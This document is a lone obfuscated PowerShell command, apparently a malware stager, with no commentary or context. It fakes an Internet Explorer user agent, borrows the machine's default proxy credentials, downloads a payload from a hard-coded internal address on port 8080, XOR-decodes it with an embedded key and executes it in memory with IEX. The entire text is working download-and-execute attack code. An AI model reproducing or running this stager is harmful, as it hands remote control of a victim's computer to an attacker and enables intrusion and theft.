
$wc=NEW-OBJect SystEM.NET.WeBCLient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadeRS.ADd('User-Agent',$u);$WC.Proxy = [SYsTem.Net.WeBREqueSt]::DEfAultWebPROXY;$wc.PrOxY.CrEDEntials = [SYsTeM.NEt.CReDeNTIALCaCHe]::DEfauLTNetWOrkCREdentiALS;$K='5f4dcc3b5aa765d61d8327deb882cf99';$I=0;[ChAR[]]$b=([chaR[]]($WC.DOwNLOADSTriNG("http://172.16.131.137:8080/index.asp")))|%{$_-BXor$k[$I++%$K.LENgTH]};IEX ($B-joIn'')

